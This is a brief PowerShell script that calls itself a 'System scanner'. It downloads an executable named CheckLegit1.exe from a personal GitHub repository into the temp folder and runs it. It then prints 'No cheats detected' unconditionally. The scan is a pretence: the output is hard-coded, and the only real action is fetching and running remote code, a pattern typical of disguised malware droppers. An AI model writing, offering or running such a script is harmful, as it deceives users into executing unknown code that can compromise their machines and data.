Write-Host "System scanner" -ForegroundColor Cyan
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/ccc/main/CheckLegit1.exe" -OutFile "$env:TEMP\CheckLegit1.exe" -UseBasicParsing
& "$env:TEMP\CheckLegit1.exe"
Write-Host "No cheats detected" -ForegroundColor Green
